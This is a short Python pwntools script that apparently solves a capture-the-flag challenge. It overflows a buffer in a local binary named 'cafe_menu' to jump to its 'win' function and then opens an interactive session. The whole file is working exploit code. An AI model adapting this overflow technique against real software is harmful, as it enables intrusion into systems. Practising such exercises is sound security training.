from pwn import *

context.binary=elf=ELF("./cafe_menu")

p=process(elf.path)
p.recv()

ret=ROP(elf).find_gadget(['ret'])[0]
payload=flat(
    b'a'*48,
    b'\x46',
    p64(elf.sym.win),
    b'\xff'

    
)
p.sendline(payload)
#gdb.attach(p)
p.interactive()